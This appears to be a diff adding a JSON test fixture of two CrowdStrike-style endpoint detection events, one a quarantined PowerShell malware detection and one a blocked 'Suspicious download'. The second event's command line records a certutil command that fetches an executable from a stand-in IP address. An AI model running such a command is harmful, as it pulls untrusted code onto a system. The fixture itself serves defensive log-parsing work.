@@ -1,0 +1,20 @@
+[
+  {"source": "crowdstrike", "event_type": "malware_detected", "host": "WIN10-01", "process": "powershell.exe", "severity": 8, "sha256": "4c2b2a1e9a3f0d7b8e6c5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d", "action": "quarantine"},
+  {
+    "metadata": {"eventType": "DetectionSummaryEvent", "eventCreationTime": 1791794400000},
+    "event": {
+      "ComputerName": "WIN11-07",
+      "UserName": "dave",
+      "FileName": "certutil.exe",
+      "CommandLine": "certutil -urlcache -split -f http://198.51.100.77/a.exe a.exe",
+      "SHA256String": "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
+      "Severity": 4,
+      "SeverityName": "High",
+      "Tactic": "Command and Control",
+      "Technique": "Ingress Tool Transfer",
+      "DetectName": "Suspicious download",
+      "PatternDispositionDescription": "Prevention, process killed.",
+      "LocalIP": "10.0.1.44"
+    }
+  }
+]
